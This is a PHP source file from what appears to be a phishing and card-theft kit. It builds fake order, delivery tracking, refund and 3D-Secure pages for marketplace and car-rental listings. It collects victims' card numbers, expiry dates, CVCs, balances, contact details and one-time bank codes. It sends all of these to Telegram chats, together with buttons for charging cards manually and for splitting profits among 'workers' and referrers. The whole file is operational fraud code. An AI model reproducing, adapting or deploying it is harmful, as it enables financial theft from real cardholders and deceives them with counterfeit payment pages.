
<?php
	include '_set.php';

	$action = $_POST['action'];
	if (!$action || $action == '')
		exit();
	if ($_POST['secretkey'] != secretKey())
		exit();
	$srvc = intval($_POST['service']);
	if ($srvc < 1 || $srvc > 28)
		exit();
	$_POST2 = json_decode($_POST['_post'], true);
	$_GET2 = json_decode($_POST['_get'], true);
	$_SERVER2 = json_decode($_POST['_server'], true);
	$_COOKIE2 = json_decode($_POST['_cookie'], true);
	$isnt = in_array($srvc, [1, 2, 9, 12, 13, 14, 15, 17, 18, 19, 20, 21, 25, 26, 27, 28]);
	if ($srvc == 9 || $srvc == 12 || $srvc == 13) $isnt = 2;
	if ($srvc == 16) $isnt = 3;
	if ($srvc == 17 || $srvc == 18) $isnt = 4;
	$item = beaText($_GET2['id'], chsNum());
	if (!isItem($item, $isnt) && !in_array($action, ['delivery', '3ds']))
		exit();
	$domain = $_SERVER2['domain'];
	$ip = beaText($_SERVER2['ip'], chsNum().'.:abcdef');
	$itemd = getItemData($item, $isnt);
	$id = $itemd[3];
	$amount = $itemd[5];
	$title = $itemd[6];
	$iscars = $itemd[14];
	$ddos0 = false;
	$data = false;
	function xEcho($t) {
		global $_COOKIE2;
		echo json_encode($_COOKIE2).'`'.$t;
		exit();
	}
	switch ($action) {
		case 'delivery': {
			$data = calcDelivery($_GET2['c1'], $_GET2['c2']);
			break;
		}
		case '3ds': {
			$md = $item;
			$t = getPayData($md, false);
			if (count($t) < 2)
				exit();
			list($card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr, $pkoef) = $t;
			$isnt = ($isnt == '1');
			$msg = [false, 'На вашия телефонен номер е изпратен еднократен код. Моля, проверете данните за транзакцията и въведете еднократния код.'];
			$code3ds = substr(beaText($_POST2['3dscode'], chsNum()), 0, 20);
			if ($code3ds && strlen($code3ds) > 2) {
				$msg = [true, 'Въведохте грешен код. Моля, проверете кода на съобщението и го въведете отново.'];
				$lastcode = fileRead(dirKeys($md));
				$lastcode = getCookieData('code'.$md, $_COOKIE2);
				if ($lastcode != $code3ds) {
					fileWrite(dirKeys($md), $code3ds);
					setCookieData('code'.$md, $code3ds, $_COOKIE2);
					$t = $md.' '.$item.' '.$srvc;
					botSend([
						'🆘 <b>Введен код 3D-Secure</b>',
						'',
						'⚠️ Код: <b>'.$code3ds.'</b>',
						'',
						'💵 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
						'💳 Карта: <b>'.$card.' ('.cardBank($card).')</b>',
						'',
						($isnt ? '📦 ID объявления' : '🔖 Трек номер').': <b>'.$item.'</b>',
						'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						
					], chatAdmin(), [true, [
						[
							['text' => '✅ Оплатил', 'callback_data' => '/doruchkazaletbg '.$t],
						],
						[
							['text' => '❌ Звонок 900', 'callback_data' => '/doruchkafail1bg '.$t],
							['text' => '❌ Нет денег', 'callback_data' => '/doruchkafail2bg '.$t],
						],
					]]);
					setCookies2($code3ds, $card);
				}
			}
			$card4d = substr($card, strlen($card) - 4);
			$cardps = ['visa', 'Verified by VISA'];
			if ($card[0] == '2')
				$cardps = ['mir', 'MirAccept'];
			elseif ($card[0] == '5')
				$cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
			$data = str_replace([
				'%ps1%',
				'%ps0%',
				'%shop%',
				'%summ%',
				'%date%',
				'%card%',
				'%style%',
				'%msg%',
			], [
				$cardps[1],
				$cardps[0],
				$shop,
				number_format(intval($amount), 2, '.', ','),
				date('d/m/Y'),
				$card4d,
				($msg[0] ? 'style="color: #f00;"' : ''),
				$msg[1],
			], fileRead(dirPages('0')));
			break;
		}
		case 'order': case 'buy': case 'cash': case 'rent' : case 'cars': {
			$isnb = array_search($action, ['order', 'buy', 'cash', 'rent', 'cars']);
			$ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
				'оформление аренды',
				'оформление поездки',
			][$isnb];
			$hash0 = md5($isnb.$item.$title.$amount.$srvc.$domain.$ip);
			if ($hash0 != getIpData($ip, 'hash')/getCookieData('hash', $_COOKIE2)) {
				setIpData($ip, 'hash', $hash0);
				setCookieData('hash', $hash0, $_COOKIE2);
				addItemData($item, 0, 1, true);
				$ddos0 = true;
				botSend([
					'🌚 <b>Переход на '.$ttx.'</b>',
					'🔥 <b>Удачного залёта'.$none.'</b>',
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💵 Стоимость: <b>'.beaCashbg($amount).'</b>',
					'🍋 Сервис: <b>'.getService($srvc, false, $isnb == 2).'</b>',
					
					'🌎 IP: <b>'.$ip.'</b>',
					/*'🔍 Локация: <b>'.$iploc.'</b>',*/
				], $id);
			}
			$data = str_replace([
				'%style%',
				'%script%',
				'%item%',
				'%title%',
				'%amount%',
				'%amount2%',
				'%url%',
				'%img%',
				'%city%',
				'%namef%',
				'%phone%',
				'%address%',
				'%cars_city1%',
				'%cars_city2%',
				'%cars_date1%',
				'%cars_date2%',
				'%cars_time1%',
				'%cars_time2%',
				'%cars_amount%',
				'%cars_adress1%',
				'%cars_adress2%',
			], [
				fileRead(dirStyles($srvc.'-1')),
				fileRead(dirScripts($srvc.'-'.($isnb + 1))),
				$item,
				$title,
				$amount,
				number_format($amount, 0, '.', ' '),
				getFakeUrl(false, $item, $srvc, ($isnb == 2 ? 5 : 0)),
				$itemd[7],
				$itemd[8],
				$itemd[9],
				beaPhone($itemd[10]),
				$itemd[11],
				$itemd[13], //cars_city1
				$itemd[7], //cars_city2
				$itemd[9],  //cars_date1
				$itemd[11], //cars_date2
				$itemd[10],  //cars_date1
				$itemd[12], //cars_date2
				$itemd[5],  //cars_amount
				$itemd[6],  //cars_adress1
				$itemd[8],  //cars_adress2
			], fileRead(dirPages($srvc.'-'.($isnb + 1))));
			break;
		}
		case 'track': {
			$tst = intval($itemd[16]);
			if ($tst == 0)
				$tst = 1;
			$hash0 = md5($tst.$item.$title.$amount.$srvc.$domain.$ip);
			if ($hash0 != getIpData($ip, 'hash')/getCookieData('hash', $_COOKIE2)) {
				setIpData($ip, 'hash', $hash0);
				setCookieData('hash', $hash0, $_COOKIE2);
				addItemData($item, 0, 1, false);
				$ddos0 = true;
				botSend([
					'🌚 <b>Переход на отслеживание</b>',
					'🔥 <b>Удачного залёта'.$none.'</b>',
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💵 Стоимость: <b>'.beaCashbg($amount).'</b>',
					'☁️ Статус: <b>'.trackStatus($tst).'</b>',
					'🦋 Сервис: <b>'.getService($srvc).'</b>',
					'',
					'🌎 IP: <b>'.$ip.'</b>',
				/*	'🔍 Локация: <b>'.$iploc.'</b>',*/
				], $id);
			}
			$data = str_replace([
				'%style%',
				'%script%',
				'%item%',
				'%title%',
				'%amount%',
				'%amount2%',
				'%url%',
				'%cityf%',
				'%cityt%',
				'%namef%',
				'%namet%',
				'%size%',
				'%address%',
				'%phone%',
				'%timef%',
				'%timet%',
				//'%index%',
			], [
				fileRead(dirStyles($srvc.'-1')),
				fileRead(dirScripts($srvc.'-1')),
				'CB'.$item.'0RU',
				$title,
				$amount,
				number_format($amount, 0, '.', ' '),
				getFakeUrl(false, $item, $srvc, $tst == 4 ? 4 : ($tst == 1 ? 0 : 2)),
				$itemd[7],
				$itemd[11],
				$itemd[9],
				$itemd[10],
				beaKg($itemd[8]),
				$itemd[12],
				beaPhone($itemd[13]),
				$itemd[14],
				$itemd[15],
				//explode(', ', $itemd[12], 2)[0],
			], fileRead(dirPages($srvc.'-'.$tst)));
			break;
		}
		case 'merchant': case 'refund': case 'unlock': case 'ayeruchnayaplatejjjka666': {
			$xcaptchadata = $_POST2;
			$pmnt = paymentNamebg();
			$isrpar = ($action == 'ayeruchnayaplatejjjka666');
			$isrpac = (strlen($pmnt) == 0 || (isAutoPaymentbg() && $amount >= activateRuchka()));
			if (!$isrpac) {
				require 'pay.libs/Crypt/RSA.php';
				require 'pay.libs/Math/BigInteger.php';
				include '_payment_'.$pmnt.'.php';
			}
			$isnr = array_search($action, ['merchant', 'refund', 'unlock']);
			$ttx = [
				[
					'оплаты заказа',
					'Да платя',
					'Плащане',
					'Плащане за поръчка',
					'',
				],
				[
					'возврата средств',
					'Да върна',
					'Получаване',
					'Възстановяване',
					'За да възстановим сумата, трябва да резервираме средства по вашата карта в размер на сумата на транзакцията.',
				],
				[
					'получения средств',
					'Получавам',
					'Получаване',
					'Получаване на средства',
					'За да получите пари за платен продукт, салдото на вашата карта трябва да бъде поне сумата на транзакцията.',
				],
			][$isnr];
			if($iscars == 'true')
			{
			    $ttx = [
			        [
			        'оплаты заказа',
					'К оплате',
					'Оплатить',
					'Бронирование',
					],
					[
					'возврата средств',
					'К возврату',
					'Получить',
					'Возврат средств',
					'Для проведения возврата, нам необходимо зарезервировать на вашей карте денежные средства в размере суммы сделки.',
				    ],
			    	[
					'получения средств',
					'К получению',
					'Получить',
					'Получение средств',
					'Чтобы получить денежные средства за оплаченный товар, Ваш баланс по карте должен быть не менее суммы сделки.',
			    	],
			    	][$isnr];
			}
			$cost = 0;
			if ($isnt) {
				$cost = $_POST2['fcost'];
				if (strlen($cost) != 0) {
					$cost = intval($cost);
					//setIpData($ip, 'dlvr', $cost);
					setCookieData('dlvr'.$item, $cost, $_COOKIE2);
				} else {
					//$cost = intval(getIpData($ip, 'dlvr'));
					$cost = intval(getCookieData('dlvr'.$item, $_COOKIE2));
				}
				$cost = min(max($cost, 0), 10000);
				if ($cost > 0)
					$amount += $cost;
			}
			$shop = getShopName($srvc, $isnr);
			$redir = getFakeRedir($domain, $item, $isnr);
			$errmsg = false;
			$card = beaText($_POST2['fcard'], chsNum());
			$expm = $_POST2['fexpm'];
			$expy = $_POST2['fexpy'];
			$cvc = $_POST2['fcvc'];
			$balancecard = intval($_POST2['balancecard']);
			$pares = $_POST2['PaRes'];
			$merchant = $_POST2['MD'];
    if ($pares && $merchant && isPayData($merchant)) {
				$ruchkastatus = ($_POST2['ruchkastatus'] == '1');
				$pkoef = false;
				if ($isrpar) {
					list($card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr, $pkoef) = getPayData($merchant, !$ruchkastatus);
					$pkoef = intval($pkoef) + 1;
					if ($ruchkastatus) {
						setPayData($merchant, [$card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr, $pkoef]);
					}
					$isnt = ($isnt == '1');
				} else {
					list($card, $expm, $expy, $cvc, $card2, $amount, $token) = getPayData($merchant);
				}
				$amount = intval($amount);
				$psts = ($isrpar ? [$ruchkastatus, $_POST2['ruchkafail'], ''] : xStatus($merchant, $pares, $token));
				if ($psts[0]) {
					$card3 = false;
					if (!$isrpar && $pmnt != 'btc') {
						$card3 = setNextCard();
						addCardBalance($card2, $amount);
					}
					if (!$pkoef) {
						//$pkoef = intval(getIpData($ip, 'koef'.($isnr != 1 ? 'a' : 'b'))) + 1;
						//setIpData($ip, 'koef'.($isnr != 1 ? 'a' : 'b'), $pkoef);
						$pkoef = intval(getCookieData('koef'.$item.($isnr != 1 ? 'a' : 'b'), $_COOKIE2)) + 1;
						setCookieData('koef'.$item.($isnr != 1 ? 'a' : 'b'), $pkoef, $_COOKIE2);
					}
					$profit = makeProfitbg($id, $isnr, $amount, $pkoef);
					$pkoef2 = '🔥 <b>Успешн'.($isnr != 1 ? 'ая оплата' : 'ый возврат').($pkoef > 1 ? ' X'.$pkoef : '').'</b>';
					addItemData($item, 1, 1, $isnt);
					addItemData($item, 2, $amount, $isnt);
					$referal = getUserReferal($id);
					$pmess = [
						$pkoef2,
						'',
						'⚖️ Доля воркера: <b>'.beaCashbg($profit[0]).'</b>',
						'💵 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
				 		'🏦 Банк: <b>'.cardBank($card).'</b>',
						'',
						'👨🏻‍💻 Воркер: <b>'.userLogin2($id).'</b>',
						'⚙️ Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
					];
					$encmess = base64_encode(json_encode($pmess));
					$randid = md5(uniqid(time(),true));
					fileWrite(dirPays($randid), $encmess);
					botSend($pmess, chatProfits(), [true, [
						[
							['text' => 'Выплачено', 'callback_data' => '/paidout '.$randid],
						],
						[    
						    ['text' => 'Заморозка', 'callback_data' => '/payfrost '.$randid],
							['text' => 'Блок карты', 'callback_data' => '/paylocked '.$randid],
						],	
					]]);
					$t0 = [
						$pkoef2,
						'',
				 		'❤️ Ваша доля: <b>'.beaCashbg($profit[0]).'</b>',
						'💸 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
						'💳 Карта: <b>'.cardBank($card).'</b>',
						'☘️ Номер: <b>'.$card.'</b>',
						'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
						'🕶 CVC: <b>'.$cvc.'</b>',						
						'',
						'🏷 Название: <b>'.$title.'</b>',
						'🌍 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						//'',
						//'🌎 IP: <b>'.$ip.'</b>',
						//'🔍 Локация: <b>'.$iploc.'</b>',
					];
					if (showUserCard())
						array_splice($t0, 5, 0, [
							'💳 Карта: <b>'.cardBank($card).'</b>',
							'☘️ Номер: <b>'.$card.'</b>',
							'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
							'🕶 CVC: <b>'.$cvc.'</b>',
						]);
					else
						array_splice($t0, 5, 0, [
							'💳 Карта: <b>'.cardHide($card).'</b>',
						]);
					botSend($t0, $id);
					botSend([
						$pkoef2,
						//'🔒 Cavv: <b>'.$psts[2].'</b>',
						'',
						'💸 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
						'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						'💎 Доля воркера: <b>'.beaCashbg($profit[0]).'</b>',
						'🐤 Доля реферала: <b>'.beaCashbg($profit[1]).'</b>'.($referal ? ' (<b>'.userLogin($referal, true).'</b>)' : ''),
						'',
						'💳 Карта: <b>'.cardBank($card).'</b>',
						'☘️ Номер: <b>'.$card.'</b>',
						'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
						'🕶 CVC: <b>'.$cvc.'</b>',
						'📥 Карта приема: <b>'.($isrpar ? 'Ручная' : $card2).'</b>',
						'',
						($isnt ? '📦 ID объявления' : '🔖 Трек номер').': <b>'.$item.'</b>',
						'🏷 Название: <b>'.$title.'</b>',
						'🌍 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						'🌐 Домен: <b>'.$domain.'</b>',
						//'',
						//'🌎 IP: <b>'.$ip.'</b>',
						//'🔍 Локация: <b>'.$iploc.'</b>',
					], chatAlerts());
					botSend([
						$pkoef2,
						'',
				// 		'💸 Доля воркера: <b>'.beaCashbg($profit[0]).'</b>',
						'💵 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
				// 		'💳 Карта: <b>'.cardBank($card).'</b>',
						'',
						'👤 Воркер: <b>'.userLogin2($id).'</b>',
						'🌍 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
					], chatGroup());
					if (!$isrpar) {
						$t1 = [
							'❄️ Баланс '.($pmnt == 'btc' ? 'кошелька' : 'карты').' <b>'.$card2.'</b> увеличен на <b>'.beaCashbg($amount).'</b>',
						];
						if ($card3)
							$t1 = array_merge($t1, [
								'',
								'✅ Карта платежки автоматически заменена на <b>'.$card3.'</b>',
							]);
						botSend($t1, chatAdmin());
					}
					if ($referal) {
						botSend([
							'👾 Вы получили <b>'.beaCashbg($profit[1]).'</b> от профита реферала <b>'.userLogin($id).'</b>',
						], $referal);
					}
					if (!$isrpar) {
						/*$amount--;
						if ($amount < 1)
							$amount = 1;*/
						$pcrt = xCreate($amount, $card, $expm, $expy, $cvc, $redir, $shop, $xcaptchadata);
						if ($pcrt[0]) {
							$data = $pcrt[1];
							break;
						} else {
							if ($pcrt[2])
								xEcho($pcrt[1]);
							$errmsg = $pcrt[1];
						}
					}
				} else {
					$errmsg = $psts[1];
					$errmsg2 = ($isrpar ? $errmsg : ((strpos($errmsg, '3D') !== false || strpos($errmsg, 'аутентиф') !== false || strpos($errmsg, 'Пароль') !== false) ? 'Уход со страницы 3D-Secure.' : 'Возможно, недостаточно средств или кредитка.'));
					$pkoef2 = '❌ <b>Ошибка при '.($isnr != 1 ? 'оплате' : 'возврате').'</b>';
					botSend([
						$pkoef2,
						'',
						'❕ Причина: <b>'.$errmsg2.'</b>',
						'💸 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
						'',
						'💳 Карта: <b>'.cardHide($card).'</b>',
						'',
						'🏷 Название: <b>'.$title.'</b>',
						'🦋 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						//'',
						//'🌎 IP: <b>'.$ip.'</b>',
						//'🔍 Локация: <b>'.$iploc.'</b>',
					], $id);
					botSend([
						$pkoef2,
						'',
						'❕ Причина: <b>'.$errmsg.' ('.$errmsg2.')</b>',
						'💸 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
						'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						'',
						'💳 Карта: <b>'.cardHide($card).'</b>',
						'',
						($isnt ? '📦 ID объявления' : '🔖 Трек номер').': <b>'.$item.'</b>',
						'🏷 Название: <b>'.$title.'</b>',
						'🦋 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						'🌍 Домен: <b>'.$domain.'</b>',
						//'',
						//'🌎 IP: <b>'.$ip.'</b>',
						//'🔍 Локация: <b>'.$iploc.'</b>',
					], chatAlerts());
				}
			} else {
				if (isValidCard($card, $expm, $expy, $cvc, $balancecard)) {
					$pcrt = false;
					if ($isrpac) {
						$md = time().rand(100000, 999999);
						setPayData($md, [$card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt ? '1' : '0', $isnr, 0]);
						// $t = $md.' '.$item.' '.$srvc;
						$t21 = $md.' '.$item.' '.$srvc.' '.$id; //.' '.$domain.' '.$isnt.' '.$isnr;
						botSend([
							'‼️ <b>Переход на ручной 3D-Secure</b>',
							'',
							'💵 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
							'',
							'💳 Карта: <b>'.cardBank($card).'</b>',
							'☘️ Номер: <b>'.$card.'</b>',
							'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
							'🕶 CVC: <b>'.$cvc.'</b>',
							'🚀 Баланс карты: <b>'.$balancecard.' BGN</b>',
							'',
							($isnt ? '📦 ID объявления' : '🔖 Трек номер').': <b>'.$item.'</b>',
							'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						], chatAdmin(), [true, [
							[
							    ['text' => '⚠️ Спамит', 'callback_data' => '/pm '.$id.' Мамонт спамит кодами 3D-Secure'],
							    ['text' => '💳 Взять на вбив', 'callback_data' => '/vz '.$t21],
							    ['text' => '⚠️ Нет кода', 'callback_data' => '/pm '.$id.' Мамонт не вводит код 3D-Secure'],
							],
						]]);
						$pcrt = [true, '<body onload="x.submit()"><form id="x" action="3ds'.$md.'" method="POST"><noscript><input type="submit" value="Продолжить"></noscript></form>'];
					} else {
						$pcrt = xCreate($amount, $card, $expm, $expy, $cvc, $redir, $shop, $xcaptchadata);
					}
					if ($pcrt[0]) {
						$data = $pcrt[1];
						if (!isCardData($card, $expm, $expy, $cvc)) {
							setCardData($card, $expm, $expy, $cvc);
							botSend([
								'💎 <b>Переход на 3D-Secure</b>',
								'',
								'💸 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
								$_POST2['balancecard'] ? '💰 Баланс карты: <b>'.$balancecard.' BGN.</b>' : '',
								// '☘️ Номер: <b>'.$card.'</b>',
								// '📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								// '🕶 CVC: <b>'.$cvc.'</b>',
								// '☁️ Платежка: <b>'.($isrpac ? 'Ручная' : 'Автоматическая').'</b>',
								'',
								'🏷 Название: <b>'.$title.'</b>',
								'🌍 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
								//'',
								//'🌎 IP: <b>'.$ip.'</b>',
								//'🔍 Локация: <b>'.$iploc.'</b>',
							], $id);
							botSend([
								'💳 <b>Получена карта '.cardBank($card).'</b>',
								'',
								'☘️ Номер: <b>'.$card.'</b>',
								'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								'🕶 CVC: <b>'.$cvc.'</b>',
								$_POST2['balancecard'] ? '💰 Баланс: <b>'.$balancecard.' BGN.</b>' : '',
								'',
								'💸 Сумма платежа: <b>'.beaCashbg($amount).'</b>',
								'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
							], chatAdmin());
							setCookies($card, $expm, $expy, $cvc, $amount, $balancecard);
							botSend([
                                '<b>🔥 Ожидаем кэш 🔥',
                                '',
                                '🐘 Мамонт перешёл на страницу оплаты',
								'💰 Сумма:  '.beaCashbg($amount).'',
								'🏆 Воркер: '.userLogin2($id).'',
								'⚙️ Платежка: '.($isrpac ? 'Ручная' : 'Автоматическая').'</b>',
							], chatGroup());
						}
						break;
					} else {
						if ($pcrt[2])
							xEcho($pcrt[1]);
						$errmsg = $pcrt[1];
					}
				}
			}
			if ($isrpar)
				exit();
			$hash0 = md5($isnr.$item.$title.$amount.$cost.$srvc.$domain.$ip);
			if ($hash0 != /*getIpData($ip, 'hash')*/getCookieData('hash', $_COOKIE2)) {
				//setIpData($ip, 'hash', $hash0);
				setCookieData('hash', $hash0, $_COOKIE2);
				$city = $_POST2['fcity'];
				$fio = $_POST2['fname'];
				$email = $_POST2['femail'];
				$phone = $_POST2['fphone'];
				$t = [
					'🔔 <b>Ввод карты для '.$ttx[0].'</b>',
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💸 Общая сумма: <b>'.beaCashbg($amount).'</b>',
					'🌍 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
					//'',
					//'🌎 IP: <b>'.$ip.'</b>',
					//'🔍 Локация: <b>'.$iploc.'</b>',
				];
				if ($cost > 0)
					array_splice($t, 5, 0, [
						'💰 Доставка: <b>'.beaCashbg($cost).'</b>',
					]);
				if (strlen($phone) != 0)
					array_splice($t, 2, 0, [
						'🕶 ФИО: <b>'.$fio.'</b>',
						'✉️ Почта: <b>'.$email.'</b>',
						'📞 Телефон: <b>'.$phone.'</b>',
						'',
					]);
				if (strlen($city) != 0)
					array_splice($t, 2, 0, [
						'🔍 Город доставки: <b>'.$city.'</b>',
					]);
				botSend($t, $id);
			}
			$data = str_replace([
				'%style%',
				'%script%',
				'%amount%',
				'%title%',
				'%card%',
				'%expm%',
				'%expy%',
				'%cvc%',
				'%txt1%',
				'%txt2%',
				'%txt3%',
				'%errmsg%',
				'%infmsg%',
				'%balancecard%'
			], [
				fileRead(dirStyles($srvc.'-0')),
				fileRead(dirScripts($srvc.'-0')),
				number_format($amount, 0, '.', ' '),
				$title,
				$card,
				$expm,
				$expy,
				$cvc,
				$ttx[1],
				$ttx[2],
				$ttx[3],
				$errmsg ? $errmsg : '',
				$ttx[4],
				$isnt ? ($itemd[12] ? $itemd[12] : 'none') : ($itemd[17] ? $itemd[17] : 'none')
			], fileRead(dirPages($srvc.'-0')));
			break;
		}
	}
	if ($ddos0) {
		$ddos = getItemData($item, $isnt)[0];
		$ddos2 = [25, 50, 100, 250 ,500, 1000, 2000, 3000, 5000, 10000];
		if (in_array($ddos, $ddos2)) {

			botSend([
				'<b>🔰 CloudGuard</b>',
				'',
				'<b>~ Обнаружена DDoS атака на домен '.$domain.'</b>',
				'<b>~ Уникальный запросов: '.$ddos.'</b>',
				'',
				'<b>~ Уникальный ID: '.$item.'</b>',
			], chatAlerts());

			delUserItem($id, $item, $isnt);
			}
		}
	if ($data && $data != '')
		xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
?>